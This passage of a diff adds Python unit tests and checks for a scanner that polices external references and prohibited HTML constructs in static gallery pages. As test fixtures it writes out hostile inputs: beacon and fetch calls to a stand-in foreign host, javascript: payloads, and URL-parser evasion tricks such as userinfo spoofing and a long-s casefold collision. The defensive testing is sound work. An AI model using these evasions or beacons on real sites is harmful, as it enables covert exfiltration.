+        self.assertReports(check_e1(self.gallery), "sample.html", lookalike)
+
+    def test_e1_rejects_a_lookalike_prefix(self) -> None:
+        self.write_document(f'<img src="https://{FIXTURE_FOREIGN_HOST}/fonts.googleapis.com/x.png">')
+
+        self.assertReports(check_e1(self.gallery), FIXTURE_FOREIGN_HOST)
+
+    def test_e1_rejects_a_trailing_root_dot(self) -> None:
+        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com./css2?display=swap">')
+
+        self.assertReports(check_e1(self.gallery), "fonts.googleapis.com.")
+
+    def test_e1_accepts_a_non_lowercase_allowlisted_host(self) -> None:
+        """Case folding is the rule: DNS is case-insensitive, so this is the same host."""
+        self.write_document('<link rel="preconnect" href="https://FONTS.GSTATIC.COM">')
+
+        self.assertEqual(check_e1(self.gallery), [])
+
+    def test_e1_rejects_a_non_lowercase_foreign_host(self) -> None:
+        self.write_document('<link rel="preconnect" href="https://EVIL.EXAMPLE">')
+
+        self.assertReports(check_e1(self.gallery), "EVIL.EXAMPLE")
+
+    # -- E2: the anchor exemption, bounded by scheme --
+
+    def test_e2_accepts_the_provenance_and_attribution_forms(self) -> None:
+        """Negative control: a scanner failing this rejects what FR-012 and FR-020 require."""
+        self.write_document(
+            '<a href="https://github.com/anthropics/html-effectiveness">upstream</a>\n'
+            '<a href="mailto:security">report</a>\n'
+            '<a href="#contents">contents</a>'
+        )
+
+        self.assertEqual(check_e2(self.gallery), [])
+        self.assertEqual(check_e1(self.gallery), [])
+
+    def test_e2_rejects_an_executable_scheme_in_the_same_position(self) -> None:
+        for scheme in ("javascript:alert(1)", "data:text/html,x", "vbscript:msgbox(1)", "blob:x"):
+            with self.subTest(msg=scheme):
+                self.setUp()
+                self.write_document(f'<a href="{scheme}">go</a>')
+
+                self.assertReports(check_e2(self.gallery), scheme)
+
+    # -- E3: parser-recognized comments and visible text (negative control) --
+
+    def test_e3_accepts_a_url_in_a_parser_recognized_comment(self) -> None:
+        self.write_document(f'<!-- upstream: https://{FIXTURE_FOREIGN_HOST}/notes -->')
+
+        self.assertClean()
+
+    def test_e3_accepts_a_url_in_visible_text(self) -> None:
+        self.write(
+            f"{TEMPLATES_DIR}/sample.html",
+            '<!doctype html>\n<html lang="en">\n<body>\n'
+            f"See https://{FIXTURE_FOREIGN_HOST}/notes for detail.\n"
+            "</body>\n</html>\n",
+        )
+
+        self.assertClean()
+
+    def test_e3_scans_comment_shaped_raw_text_inside_a_script(self) -> None:
+        """Script content is raw text, not a comment — a pre-parse strip would blind itself."""
+        self.write_document(
+            f"<script>\n<!-- fetch('https://{FIXTURE_FOREIGN_HOST}/beacon') -->\n</script>"
+        )
+
+        self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)
+
+    # -- E4: the swap-behaviour parameter --
+
+    def test_e4_rejects_a_font_stylesheet_without_the_display_parameter(self) -> None:
+        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist">')
+
+        self.assertReports(check_e4(self.gallery), "sample.html", "display")
+
+    def test_e4_rejects_a_blocking_display_value(self) -> None:
+        self.write_document(
+            '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Geist&amp;display=block">'
+        )
+
+        self.assertReports(check_e4(self.gallery), "display")
+
+    def test_e4_matches_the_relation_case_insensitively_and_across_multiple_values(self) -> None:
+        for relation in ("STYLESHEET", "alternate stylesheet", "stylesheet  preload"):
+            with self.subTest(msg=relation):
+                self.setUp()
+                self.write_document(f'<link rel="{relation}" href="https://fonts.googleapis.com/css2?family=Geist">')
+
+                self.assertReports(check_e4(self.gallery), "display")
+
+    # -- E5: the structured-parse conjunction --
+
+    def test_e5_rejects_a_userinfo_segment_reading_as_an_allowlisted_host(self) -> None:
+        spoofed = _with_userinfo(f"https://{FIXTURE_FOREIGN_HOST}", "fonts.googleapis.com/x.css")
+        self.write_document(f'<link rel="stylesheet" href="{spoofed}">')
+
+        self.assertReports(check_e5(self.gallery), "sample.html", spoofed)
+
+    def test_e5_rejects_an_explicit_port(self) -> None:
+        self.write_document('<link rel="stylesheet" href="https://fonts.googleapis.com:8443/css2?display=swap">')
+
+        self.assertReports(check_e5(self.gallery), "8443")
+
+    def test_e5_rejects_a_reference_that_does_not_round_trip(self) -> None:
+        self.write_document('<link rel="stylesheet" href="HTTPS://fonts.googleapis.com/css2?display=swap">')
+
+        self.assertReports(check_e5(self.gallery), "HTTPS://")
+
+    def test_e5_reuses_the_repositorys_hardened_conjunction(self) -> None:
+        """Behavioural pin: the same conjunction rejects the same shapes upstream."""
+        valid = "https://platform.openai.com/docs"
+        self.assertTrue(_OPENAI_URL(valid))
+        for mutated in (
+            f"{valid.replace('https://', 'HTTPS://')}",
+            "https://platform.openai.com:8443/docs",
+            _with_userinfo("https://" + FIXTURE_FOREIGN_HOST, "platform.openai.com/docs"),
+        ):
+            with self.subTest(msg=mutated):
+                self.assertFalse(_OPENAI_URL(mutated))
+
+    # -- E6: pre-parse character rejection --
+
+    def test_e6_rejects_a_backslash_authority(self) -> None:
+        """The scanner-versus-browser differential: Python reports the allowlisted host."""
+        differential = _with_userinfo(f"https://{FIXTURE_FOREIGN_HOST}\\", "fonts.googleapis.com/x.css")
+        self.assertEqual(urlsplit(differential).hostname, "fonts.googleapis.com")
+        self.write_document(f'<link rel="stylesheet" href="{differential}">')
+
+        self.assertReports(check_e6(self.gallery), "sample.html", differential)
+
+    def test_e6_rejects_whitespace_control_and_delimiter_characters(self) -> None:
+        for reference in (
+            "https://fonts.googleapis.com/a b",
+            "https://fonts.googleapis.com/a\tb",
+            "https://fonts.googleapis.com/a\x7fb",
+            "https://fonts.googleapis.com/a<b",
+            "https://fonts.googleapis.com/a>b",
+            "https://fonts.googleapis.com/a|b",
+            "https://fonts.googleapis.com/a`b",
+        ):
+            with self.subTest(msg=repr(reference)):
+                self.setUp()
+                self.write_stylesheet(f"@import url('{reference}');")
+
+                self.assertTrue(check_e6(self.gallery), f"{reference!r} was admitted")
+
+    def test_e6_rejects_a_character_that_case_folds_into_an_allowlisted_host(self) -> None:
+        """``casefold`` is lossy, so the grammar clause is what keeps E1 honest.
+
+        U+017F is not ``s`` and folds to ``s``, so exact case-folded equality
+        admits this host, the round-trip conjunction admits it, and a rejection
+        written only as a list of bad delimiters admits it too. Executed rather
+        than reasoned about: the assertions below are what the parser and the
+        comparison actually do.
+        """
+        collision = "https://fontſ.gstatic.com/x.png"  # U+017F LATIN SMALL LETTER LONG S
+        self.assertEqual(urlsplit(collision).hostname.casefold(), "fonts.gstatic.com")
+        self.write_document(f'<img src="{collision}">')
+
+        self.assertEqual(check_e1(self.gallery), [], "E1 alone admits it — that is the point")
+        self.assertEqual(check_e5(self.gallery), [], "the round-trip conjunction alone admits it too")
+        self.assertReports(check_e6(self.gallery), "sample.html", collision)
+
+    def test_e6_reuses_the_repositorys_pre_parse_rejection(self) -> None:
+        """Behavioural pin: the release-note policy rejects the same character classes."""
+        self.assertTrue(_VALIDATED_HTTP_URL("https://fonts.googleapis.com/css2"))
+        for reference in (
+            "https://fonts.googleapis.com/a b",
+            "https://fonts.googleapis.com/a\x01b",
+            "https://fonts.googleapis.com/a\\b",
+            "https://fonts.googleapis.com/a<b",
+            "https://fonts.googleapis.com/a>b",
+            "https://fonts.googleapis.com/a|b",
+            "https://fonts.googleapis.com/a`b",
+        ):
+            with self.subTest(msg=repr(reference)):
+                self.assertFalse(_VALIDATED_HTTP_URL(reference))
+
+    # -- E7: the scheme rule, against the corpus this repository already owns --
+
+    def test_e7_reuses_the_repositorys_unsafe_destination_corpus(self) -> None:
+        corpus = _unsafe_destination_corpus()
+        self.assertTrue(corpus, f"the unsafe-destination corpus was not found in {RELEASE_NOTE_POLICY_TEST.name}")
+        for destination in corpus:
+            relative = not urlsplit(destination).scheme and not destination.startswith("//")
+            with self.subTest(msg=destination):
+                self.setUp()
+                self.write_document(f'<img src="{destination}">')
+                if relative:
+                    self.assertClean()
+                else:
+                    self.assertTrue(self.failures(), f"{destination!r} was admitted in a resource position")
+
+    def test_e7_rejects_an_executable_scheme_in_a_resource_position(self) -> None:
+        self.write_document('<img src="javascript:alert(1)">')
+
+        self.assertReports(check_e7(self.gallery), "sample.html", "javascript:")
+
+    def test_e7_accepts_a_same_document_relative_reference(self) -> None:
+        self.write_document('<img src="#logo">')
+
+        self.assertClean()
+
+    # -- E8: fail closed on what an evader controls --
+
+    def test_e8_rejects_an_absolute_reference_yielding_no_host(self) -> None:
+        self.write_document('<img src="https://">')
+
+        self.assertReports(check_e8(self.gallery), "sample.html")
+
+    def test_e8_rejects_a_reference_that_cannot_be_parsed(self) -> None:
+        self.write_document('<img src="https://[oops/x">')
+
+        self.assertReports(check_e8(self.gallery), "sample.html")
+
+    # -- E9: both @import forms --
+
+    def test_e9_rejects_the_bare_string_import_form(self) -> None:
+        self.write_stylesheet(f'@import "https://{FIXTURE_FOREIGN_HOST}/a.css";')
+
+        self.assertScanned(CANONICAL_FILES[BRAND_BLOCK], FIXTURE_FOREIGN_HOST)
+
+    def test_e9_rejects_the_url_token_import_form(self) -> None:
+        self.write_stylesheet(f'@import url("https://{FIXTURE_FOREIGN_HOST}/a.css");')
+
+        self.assertScanned(CANONICAL_FILES[BRAND_BLOCK], FIXTURE_FOREIGN_HOST)
+
+    # -- E10: escapes are refused rather than decoded --
+
+    def test_e10_rejects_an_escape_in_an_import_reference(self) -> None:
+        self.write_stylesheet('@import "\\68 ttps://evil.example/a.css";')
+
+        self.assertReports(check_e10(self.gallery), CANONICAL_FILES[BRAND_BLOCK])
+
+    def test_e10_rejects_an_escape_in_a_url_token(self) -> None:
+        self.write_stylesheet("body { background: url(\\68 ttps://evil.example/a.png); }")
+
+        self.assertReports(check_e10(self.gallery), CANONICAL_FILES[BRAND_BLOCK])
+
+    # -- E11: every srcset candidate, split by the documented algorithm --
+
+    def test_e11_scans_every_candidate_not_only_the_first(self) -> None:
+        self.write_document(
+            '<img srcset="https://fonts.gstatic.com/a.png 1x, '
+            f'https://{FIXTURE_FOREIGN_HOST}/b.png 2x">'
+        )
+
+        self.assertScanned("sample.html", f"https://{FIXTURE_FOREIGN_HOST}/b.png")
+
+    def test_e11_does_not_treat_a_comma_inside_a_url_as_a_separator(self) -> None:
+        self.write_document(f'<img srcset="https://{FIXTURE_FOREIGN_HOST}/x,y.png 1x">')
+
+        self.assertScanned(f"https://{FIXTURE_FOREIGN_HOST}/x,y.png")
+
+    def test_e11_scans_a_link_imagesrcset(self) -> None:
+        self.write_document(
+            f'<link rel="preload" as="image" imagesrcset="https://{FIXTURE_FOREIGN_HOST}/a.png 1x">'
+        )
+
+        self.assertScanned(f"https://{FIXTURE_FOREIGN_HOST}/a.png")
+
+    # -- E12: scheme-relative references --
+
+    def test_e12_rejects_a_scheme_relative_reference(self) -> None:
+        self.write_document(f'<img src="//{FIXTURE_FOREIGN_HOST}/x.png">')
+
+        self.assertReports(check_e12(self.gallery), "sample.html", f"//{FIXTURE_FOREIGN_HOST}/x.png")
+
+    def test_e12_rejects_a_scheme_relative_reference_to_an_allowlisted_host(self) -> None:
+        """A host-only rule sees an allowed host here; the prohibition is what fails it."""
+        self.write_document('<img src="//fonts.gstatic.com/x.png">')
+
+        self.assertReports(check_e12(self.gallery), "//fonts.gstatic.com/x.png")
+
+    # -- the positions the earlier enumeration omitted --
+
+    def test_the_omitted_element_positions_are_scanned(self) -> None:
+        for markup in (
+            '<source src="{url}">',
+            '<source srcset="{url}">',
+            '<video src="{url}"></video>',
+            '<video poster="{url}"></video>',
+            '<audio src="{url}"></audio>',
+            '<track src="{url}">',
+            '<object data="{url}"></object>',
+            '<embed src="{url}">',
+            '<input type="image" src="{url}">',
+            '<svg><image href="{url}"></image></svg>',
+            '<svg><use href="{url}"></use></svg>',
+            '<svg><use xlink:href="{url}"></use></svg>',
+            '<form action="{url}"></form>',
+            '<a ping="{url}">go</a>',
+            '<meta http-equiv="refresh" content="0;url={url}">',
+            '<base href="{url}">',
+            '<iframe src="{url}"></iframe>',
+            '<script src="{url}"></script>',
+        ):
+            with self.subTest(msg=markup):
+                self.setUp()
+                self.write_document(markup.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x"))
+
+                self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)
+
+    def test_every_fetching_link_relation_is_scanned(self) -> None:
+        for relation in (
+            "stylesheet",
+            "preload",
+            "modulepreload",
+            "prefetch",
+            "icon",
+            "manifest",
+            "preconnect",
+            "dns-prefetch",
+        ):
+            with self.subTest(msg=relation):
+                self.setUp()
+                self.write_document(f'<link rel="{relation}" href="https://{FIXTURE_FOREIGN_HOST}/x">')
+
+                self.assertScanned(FIXTURE_FOREIGN_HOST)
+
+    # -- the style and network-call surface forms --
+
+    def test_the_url_token_is_matched_in_every_ordinary_surface_form(self) -> None:
+        for form in (
+            "url({url})",
+            "url('{url}')",
+            'url("{url}")',
+            "URL({url})",
+            "url(  {url}  )",
+            "url(\n  '{url}'\n)",
+        ):
+            with self.subTest(msg=form):
+                self.setUp()
+                self.write_stylesheet(
+                    "body { background: " + form.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x.png") + "; }"
+                )
+
+                self.assertScanned(FIXTURE_FOREIGN_HOST)
+
+    def test_every_network_call_position_is_scanned(self) -> None:
+        for call in (
+            "fetch('{url}')",
+            "request.open('GET', '{url}')",
+            "new WebSocket('{url}')",
+            "navigator.sendBeacon('{url}')",
+            "new Worker('{url}')",
+            "new EventSource('{url}')",
+            "importScripts('{url}')",
+            "import('{url}')",
+        ):
+            with self.subTest(msg=call):
+                self.setUp()
+                self.write_document(
+                    "<script>\n" + call.format(url=f"https://{FIXTURE_FOREIGN_HOST}/x") + ";\n</script>"
+                )
+
+                self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)
+
+    def test_a_network_call_inside_an_attribute_value_is_scanned(self) -> None:
+        self.write_document(
+            f"""<img src="{FIXTURE_ALLOWED_FONT_REQUEST}" onerror="fetch('https://{FIXTURE_FOREIGN_HOST}/x')">"""
+        )
+
+        self.assertScanned("sample.html", FIXTURE_FOREIGN_HOST)
+
+    def test_a_character_reference_is_decoded_in_a_parsed_position(self) -> None:
+        """Entity encoding is not an evasion where the parser owns the position."""
+        self.write_document(f'<img src="&#104;ttps://{FIXTURE_FOREIGN_HOST}/x">')
+
+        self.assertScanned(FIXTURE_FOREIGN_HOST)
+
+
+# ---------------------------------------------------------------------------
+# Group J — prohibited constructs (FR-027)
+# ---------------------------------------------------------------------------
+
+
+POLICY_EQUIV = "content-security-policy"
+POLICY_VALUE = "'none'"
+FORBIDDEN_POLICY_VALUE = "'self'"
+
+# The five an in-document declaration can carry and the gallery needs none of,
+# so restricting them breaks nothing.
+REQUIRED_DIRECTIVES: tuple[str, ...] = ("base-uri", "form-action", "object-src", "frame-src", "connect-src")
+
+# The three the in-document delivery algorithm strips. Their presence marks an
+# author relying on protection that was removed.
+STRIPPED_DIRECTIVES: tuple[str, ...] = ("report-uri", "report-to", "frame-ancestors", "sandbox")
+
+# Elements that carry no content of their own, so their appearing before the
+# declaration leaves nothing outside its coverage. J7 owns a declaration that
+# is not in the head at all.
+STRUCTURAL_ELEMENTS: frozenset[str] = frozenset({"html", "head", "body"})
+
+HEAD_ELEMENT = "head"
+BASE_ELEMENT = "base"
+FORM_ELEMENT = "form"
+SRCDOC_ATTRIBUTE = "srcdoc"
+PING_ATTRIBUTE = "ping"
+ACTION_ATTRIBUTE = "action"
+
+# A scheme-relative reference written anywhere, not only in a position group E
+# collects. The dotted host and the negative lookbehind are what keep an
+# ordinary ``https://`` reference and a ``//`` line comment out of it.
+_SCHEME_RELATIVE_TEXT_RE = re.compile(r"(?<![:/\w])//[A-Za-z0-9][A-Za-z0-9.\-]*\.[A-Za-z]{2,}")
+
+
+def _artifacts(gallery_root: Path) -> list[tuple[str, str, list[_Element]]]:
+    """Every artifact, parsed once: label, text, and elements in document order."""
+    documents: list[tuple[str, str, list[_Element]]] = []
+    for path in _artifact_files(gallery_root, "*.html"):
+        text = _document_text(path)
+        documents.append((_label(gallery_root, path), text, _elements(text)))
+    return documents
+
+
+def _policy_element(elements: list[_Element]) -> _Element | None:
+    for element in elements:
+        if element.tag != "meta":
+            continue
+        if any(name == "http-equiv" and value.casefold() == POLICY_EQUIV for name, value in element.attributes):
+            return element
+    return None
+
+
+def _policy_content(element: _Element) -> str:
+    return next((value for name, value in element.attributes if name == "content"), "")
+
+
+def _directives(content: str) -> list[tuple[str, str]]:
+    """Each directive as its name and the rest of its value, folded."""
+    parsed: list[tuple[str, str]] = []
+    for part in content.split(";"):
+        tokens = part.split()
+        if tokens:
+            parsed.append((tokens[0].casefold(), " ".join(tokens[1:])))
+    return parsed
+
+
+def _encoding_declaration(element: _Element) -> bool:
+    if element.tag != "meta":
+        return False
+    names = {name for name, _ in element.attributes}
+    if "charset" in names:
+        return True
+    return any(name == "http-equiv" and value.casefold() == "content-type" for name, value in element.attributes)
+
+
+def check_j1(gallery_root: Path) -> list[str]:
+    """J1 — no ``base`` element.
+
+    The one construct that defeats group E completely rather than partially. It
+    carries no disallowed host: it changes what every *other* reference resolves
+    to, so an artifact whose references are all relative loads all of them from
+    an attacker's host with nothing foreign in any scanned position. No amount
+    of host checking sees it, which is why it is a prohibition on the construct
+    rather than a rule inside the scan. A single-file artifact has no use for
+    one.
+    """
+    return [
+        f"{label}: carries a '{BASE_ELEMENT}' element, which redefines what every relative reference "
+        "resolves to and leaves no foreign host in any position group E scans"
+        for label, _, elements in _artifacts(gallery_root)
+        for element in elements
+        if element.tag == BASE_ELEMENT
+    ]
+
+
+def check_j2(gallery_root: Path) -> list[str]:
+    """J2 — no scheme-relative reference anywhere.
+
+    Broader than E12, which reads the positions the scanner collects. Opened
+    from disk the reference resolves against ``file:`` rather than a network
+    scheme, which on one major platform composes a network-share path and an
+    authenticated connection to an attacker-named host; and it is invisible to
+    any pattern keyed on an explicit scheme.
+    """
+    return [
+        f"{label}: carries the scheme-relative reference '{match.group(0)}', which resolves against the "
+        "document's own scheme rather than a network one"
+        for label, text, _ in _artifacts(gallery_root)
+        for match in _SCHEME_RELATIVE_TEXT_RE.finditer(text)
+    ]
+
+
+def check_j3(gallery_root: Path) -> list[str]:
+    """J3 — no ``on*`` event-handler attribute.
+
+    Executable content in a position no resource-load scan reads. It can hold a
+    network destination while the element's own ``src`` stays innocuous, which
+    is why group E scans call literals inside attribute values as well — but the
+    prohibition is what makes that scan's regex weakness not matter.
+    """
+    return [
+        f"{label}: <{element.tag}> carries the event-handler attribute '{name}', which is executable "
+        "content in a position no resource-load scan reads"
+        for label, _, elements in _artifacts(gallery_root)
+        for element in elements
+        for name, _value in element.attributes
+        if name.startswith(EVENT_HANDLER_PREFIX)
+    ]
+
+
+def check_j4(gallery_root: Path) -> list[str]:
+    """J4 — no ``srcdoc`` attribute: a complete nested document, with its own
+    script, carried in an attribute value."""
+    return [
+        f"{label}: <{element.tag}> carries a '{SRCDOC_ATTRIBUTE}' attribute, which is a complete nested "
+        "document written inside an attribute value"
+        for label, _, elements in _artifacts(gallery_root)
+        for element in elements
+        for name, _value in element.attributes
+        if name == SRCDOC_ATTRIBUTE
+    ]
+
+
+def check_j5(gallery_root: Path) -> list[str]:
+    """J5 — no ``form`` with an ``action``, and no ``ping`` attribute anywhere.
+
+    Both send rather than fetch. ``ping`` is the sharper case because it rides
+    the ``a`` element E2 exempts, so the exemption that keeps provenance links
+    working would otherwise carry a beacon with it.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        for element in elements:
+            names = {name for name, _ in element.attributes}
+            if element.tag == FORM_ELEMENT and ACTION_ATTRIBUTE in names:
+                failures.append(
+                    f"{label}: carries a '{FORM_ELEMENT}' element with an '{ACTION_ATTRIBUTE}', which sends "
+                    "rather than fetches"
+                )
+            if PING_ATTRIBUTE in names:
+                failures.append(
+                    f"{label}: <{element.tag}> carries a '{PING_ATTRIBUTE}' attribute, which sends a beacon "
+                    "from the one position E2 exempts"
+                )
+    return failures
+
+
+def check_j6(gallery_root: Path) -> list[str]:
+    """J6 — every artifact carries an in-document policy declaration.
+
+    The artifacts run with no server, so no response header reaches them and an
+    in-document declaration is the only policy channel available. It is defense
+    in depth layered behind group E and not a replacement for it — J1-J5 and
+    E1-E12 each fail independently, so neither being weakened silently disarms
+    the other. The directive set is narrow on purpose: the gallery legitimately
+    needs none of the five, so restricting them breaks nothing.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        element = _policy_element(elements)
+        if element is None:
+            failures.append(
+                f"{label}: carries no in-document policy declaration, so the positions a static scan "
+                "provably cannot see are covered by nothing"
+            )
+            continue
+        named = {name for name, _ in _directives(_policy_content(element))}
+        missing = [directive for directive in REQUIRED_DIRECTIVES if directive not in named]
+        if missing:
+            failures.append(
+                f"{label}: the policy declaration names none of {missing}, so that reach is unrestricted"
+            )
+    return failures
+
+
+def check_j7(gallery_root: Path) -> list[str]:
+    """J7 — the declaration is a direct child of the head element.
+
+    Anywhere else the whole policy is discarded at parse and the artifact looks
+    protected while carrying nothing. There is no visible symptom — a console
+    message at most — which is why this is checked at build time rather than
+    left to a browser to reveal.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        element = _policy_element(elements)
+        if element is None:
+            continue  # J6 owns an absent declaration
+        if element.parent != HEAD_ELEMENT:
+            failures.append(
+                f"{label}: the policy declaration sits inside '{element.parent}' rather than being a direct "
+                f"child of '{HEAD_ELEMENT}', so it is discarded at parse and the artifact carries no policy"
+            )
+    return failures
+
+
+def check_j8(gallery_root: Path) -> list[str]:
+    """J8 — no content-bearing element precedes the declaration.
+
+    Only a character-encoding declaration may. Content before it is outside its
+    coverage, so the artifact is partly unprotected in a way nothing else
+    reveals.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        element = _policy_element(elements)
+        if element is None:
+            continue  # J6 owns an absent declaration
+        for preceding in elements[: element.order]:
+            if preceding.tag in STRUCTURAL_ELEMENTS or _encoding_declaration(preceding):
+                continue
+            failures.append(
+                f"{label}: '{preceding.tag}' precedes the policy declaration, so it is outside the "
+                "declaration's coverage while the artifact reads as protected throughout"
+            )
+    return failures
+
+
+def check_j9(gallery_root: Path) -> list[str]:
+    """J9 — each restricted directive names ``'none'``, and never ``'self'``.
+
+    A document opened from the filesystem has an implementation-defined, usually
+    opaque origin, so ``'self'`` resolves inconsistently across engines — it is
+    the value most likely to be written by an author who believes it is the
+    conservative one.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        element = _policy_element(elements)
+        if element is None:
+            continue  # J6 owns an absent declaration
+        for name, value in _directives(_policy_content(element)):
+            if name not in REQUIRED_DIRECTIVES:
+                continue
+            if value.casefold() != POLICY_VALUE:
+                reason = (
+                    f"resolves against an opaque filesystem origin and so differs across engines"
+                    if value.casefold() == FORBIDDEN_POLICY_VALUE
+                    else "leaves that reach open"
+                )
+                failures.append(f"{label}: the policy declaration sets '{name} {value}', which {reason}")
+    return failures
+
+
+def check_j10(gallery_root: Path) -> list[str]:
+    """J10 — the declaration names none of the directives stripped in-document.
+
+    The in-document delivery algorithm strips exactly the reporting-endpoint,
+    frame-ancestry, and sandbox directives. None of the five J6 requires is
+    among them, so their presence is not a partial policy — it is an author
+    relying on protection that was silently removed.
+    """
+    failures: list[str] = []
+    for label, _, elements in _artifacts(gallery_root):
+        element = _policy_element(elements)
+        if element is None:
+            continue  # J6 owns an absent declaration
+        for name, _value in _directives(_policy_content(element)):
+            if name in STRIPPED_DIRECTIVES:
+                failures.append(
+                    f"{label}: the policy declaration names '{name}', which is stripped from an in-document "
+                    "declaration, so the artifact relies on protection that was removed"
+                )
+    return failures
+
+
+GROUP_J_CHECKS: tuple[tuple[str, Callable[[Path], list[str]]], ...] = (
+    ("J1", check_j1),
+    ("J2", check_j2),
+    ("J3", check_j3),
+    ("J4", check_j4),
+    ("J5", check_j5),
+    ("J6", check_j6),
+    ("J7", check_j7),
+    ("J8", check_j8),
+    ("J9", check_j9),
+    ("J10", check_j10),
+)
+
+
+class ProhibitedConstructTests(unittest.TestCase):
+    """Group J against the shipped gallery.
+
+    Every check sweeps an empty set here: ART-001 ships no artifact, so this
+    case proves only that an artifact-free gallery is not an error. The fixture
+    case below is the whole of group J's evidence, which is why every one of the
+    ten is exercised there rather than declared.
+    """
+
+    def test_group_j_passes_against_the_shipped_gallery(self) -> None:
+        for name, check in GROUP_J_CHECKS:
+            with self.subTest(msg=name):
+                self.assertEqual(check(GALLERY_ROOT), [])
+
+    def test_the_shipped_gallery_carries_no_artifact_so_group_j_is_vacuous(self) -> None:
+        self.assertEqual(_artifact_files(GALLERY_ROOT, "*.html"), [])
+
+
+# --- Group J fixtures ------------------------------------------------------
+
+FIXTURE_POLICY = "base-uri 'none'; form-action 'none'; object-src 'none'; frame-src 'none'; connect-src 'none'"
+FIXTURE_ARTIFACT_ID = "sample"
+FIXTURE_ARTIFACT_LABEL = f"{TEMPLATES_DIR}/{FIXTURE_ARTIFACT_ID}.html"
+
+
+class ProhibitedConstructFixtureCase(GalleryFixtureCase):
+    """A synthetic artifact carrying exactly the construct under test."""
+
+    def write_artifact(
+        self,
+        *,
+        policy: str | None = FIXTURE_POLICY,
+        before_policy: str = "",
+        head: str = "",
+        body: str = "",
+        identifier: str = FIXTURE_ARTIFACT_ID,
+        policy_in_body: bool = False,
+    ) -> Path:
+        declaration = (
+            f'<meta http-equiv="Content-Security-Policy" content="{policy}">\n' if policy is not None else ""
+        )
+        return self.write(
+            f"{TEMPLATES_DIR}/{identifier}.html",
+            '<!doctype html>\n<html lang="en">\n<head>\n'
+            '<meta charset="utf-8">\n'
+            f"{'' if policy_in_body else before_policy}"
+            f"{'' if policy_in_body else declaration}"
+            f"{head}"
+            "</head>\n<body>\n"
+            f"{declaration if policy_in_body else ''}"
+            f"{body}"
+            "</body>\n</html>\n",
+        )
+
+    def failures(self) -> list[str]:
+        collected: list[str] = []
+        for _, check in GROUP_J_CHECKS:
+            collected.extend(check(self.gallery))
+        return collected
+
+
+class ProhibitedConstructFixtureTests(ProhibitedConstructFixtureCase):
+    """Group J against synthetic artifacts built in a temporary directory."""
+
+    def test_a_conforming_artifact_passes_every_check(self) -> None:
+        self.write_artifact(head='<title>Sample</title>\n', body="<h1>Sample</h1>\n")
+
+        self.assertEqual(self.failures(), [])
+
+    # -- J1: the construct that defeats group E completely --
+
+    def test_j1_rejects_a_base_element(self) -> None:
+        self.write_artifact(head=f'<base href="https://{FIXTURE_FOREIGN_HOST}/">\n')
+
+        self.assertReports(check_j1(self.gallery), FIXTURE_ARTIFACT_LABEL, "base")
+
+    # -- J2: scheme-relative references anywhere --
+
+    def test_j2_rejects_a_scheme_relative_reference(self) -> None:
+        self.write_artifact(body=f'<img src="//{FIXTURE_FOREIGN_HOST}/x.png">\n')
+
+        self.assertReports(check_j2(self.gallery), FIXTURE_ARTIFACT_LABEL, f"//{FIXTURE_FOREIGN_HOST}")
+
+    # -- J3: executable content in a position no resource scan reads --
+
+    def test_j3_rejects_an_event_handler_attribute(self) -> None:
+        self.write_artifact(body='<button onclick="run()">go</button>\n')
+
+        self.assertReports(check_j3(self.gallery), FIXTURE_ARTIFACT_LABEL, "onclick")
+
+    # -- J4: a complete nested document in an attribute value --
+
+    def test_j4_rejects_a_srcdoc_attribute(self) -> None:
+        self.write_artifact(body='<iframe srcdoc="<p>nested</p>"></iframe>\n')
+
+        self.assertReports(check_j4(self.gallery), FIXTURE_ARTIFACT_LABEL, "srcdoc")
+
+    # -- J5: the two send positions --
+
+    def test_j5_rejects_a_form_with_an_action(self) -> None:
+        self.write_artifact(body=f'<form action="https://{FIXTURE_FOREIGN_HOST}/collect"></form>\n')
+
+        self.assertReports(check_j5(self.gallery), FIXTURE_ARTIFACT_LABEL, "action")
+
+    def test_j5_accepts_a_form_without_an_action(self) -> None:
+        self.write_artifact(body="<form><input></form>\n")
+
+        self.assertEqual(check_j5(self.gallery), [])
+
+    def test_j5_rejects_a_ping_attribute(self) -> None:
+        self.write_artifact(body=f'<a href="#x" ping="https://{FIXTURE_FOREIGN_HOST}/beacon">go</a>\n')
+
+        self.assertReports(check_j5(self.gallery), FIXTURE_ARTIFACT_LABEL, "ping")
+
+    # -- J6: the declaration and its directives --
+
+    def test_j6_rejects_an_artifact_with_no_declaration(self) -> None:
+        self.write_artifact(policy=None)
+
+        self.assertReports(check_j6(self.gallery), FIXTURE_ARTIFACT_LABEL)
+
+    def test_j6_rejects_a_declaration_missing_a_required_directive(self) -> None:
+        for directive in ("base-uri", "form-action", "object-src", "frame-src", "connect-src"):
+            with self.subTest(msg=directive):
+                self.setUp()
+                kept = "; ".join(
+                    part for part in FIXTURE_POLICY.split("; ") if not part.startswith(f"{directive} ")
+                )
+                self.write_artifact(policy=kept)
+
+                self.assertReports(check_j6(self.gallery), FIXTURE_ARTIFACT_LABEL, directive)
+
+    # -- J7: placement, which is what decides whether the policy exists at all --
+
+    def test_j7_rejects_a_declaration_outside_the_head(self) -> None:
+        self.write_artifact(policy_in_body=True)
+
+        self.assertReports(check_j7(self.gallery), FIXTURE_ARTIFACT_LABEL, "head")
+
+    # -- J8: coverage, which starts where the declaration does --
+
+    def test_j8_rejects_a_content_bearing_element_before_the_declaration(self) -> None:
+        self.write_artifact(before_policy="<title>Sample</title>\n")
+
+        self.assertReports(check_j8(self.gallery), FIXTURE_ARTIFACT_LABEL, "title")
+
+    def test_j8_accepts_a_character_encoding_declaration_before_it(self) -> None:
+        self.write_artifact()
+
+        self.assertEqual(check_j8(self.gallery), [])
+
+    # -- J9: 'none', because a filesystem origin is opaque --
+
+    def test_j9_rejects_a_self_valued_directive(self) -> None:
